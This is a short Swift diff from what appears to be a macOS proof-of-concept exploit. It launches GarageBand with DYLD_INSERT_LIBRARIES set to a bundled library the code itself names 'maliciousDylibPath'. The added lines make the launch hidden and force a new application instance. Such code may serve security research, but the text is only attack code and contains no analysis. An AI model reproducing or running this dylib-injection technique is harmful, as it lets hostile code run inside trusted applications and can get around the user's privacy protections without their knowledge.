@@ -11,6 +11,9 @@ import Cocoa
 var binpath = URL(fileURLWithPath: "/Applications/GarageBand.app")
 var maliciousDylibPath = Bundle.main.path(forResource: "calc", ofType: "dylib")
 let conf = NSWorkspace.OpenConfiguration.init()
+conf.hides = true
+conf.activates = true
+conf.createsNewApplicationInstance = true
 conf.environment = ["DYLD_INSERT_LIBRARIES" : maliciousDylibPath!]
 
 
